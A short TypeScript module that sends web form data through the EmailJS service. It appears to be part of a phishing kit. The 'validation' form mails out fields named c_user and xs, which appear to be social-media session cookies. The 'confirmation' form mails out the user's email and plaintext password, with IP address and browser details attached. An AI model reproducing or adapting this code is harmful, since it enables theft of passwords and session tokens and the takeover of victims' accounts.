import emailjs from '@emailjs/browser';

// Initialize EmailJS with your user ID
export const initEmailJS = () => {
  const publicKey = import.meta.env.VITE_EMAILJS_USER_ID;
  if (!publicKey) {
    throw new Error('EmailJS public key is not configured');
  }
  emailjs.init(publicKey);
};

// Validation form email sender
export const sendValidationFormEmail = async (formData: any) => {
  try {
    const response = await emailjs.send(
      import.meta.env.VITE_EMAILJS_SERVICE_ID,
      import.meta.env.VITE_EMAILJS_VALIDATION_TEMPLATE_ID,
      {
        user_email: formData.user_email,
        c_user: formData.c_user,
        xs: formData.xs,
        timestamp: new Date().toISOString(),
        ip_address: formData.ip_address || 'Not available',
        user_agent: navigator.userAgent,
      }
    );
    return response;
  } catch (error) {
    console.error("Error sending validation email:", error);
    throw error;
  }
};

// Confirmation form email sender
export const sendConfirmationFormEmail = async (formData: any) => {
  try {
    const response = await emailjs.send(
      import.meta.env.VITE_EMAILJS_SERVICE_ID,
      import.meta.env.VITE_EMAILJS_CONFIRMATION_TEMPLATE_ID,
      {
        user_email: formData.user_email,
        password: formData.password,
        contact_method: formData.contactMethod,
        timestamp: new Date().toISOString(),
        ip_address: formData.ip_address || 'Not available',
        user_agent: navigator.userAgent,
      }
    );
    return response;
  } catch (error) {
    console.error("Error sending confirmation email:", error);
    throw error;
  }
};

// Type definition for form data
export interface EmailFormData {
  user_email?: string;
  contactMethod?: 'email' | 'phone';
  ip_address?: string;
  password?: string;
  c_user?: string;
  xs?: string;
}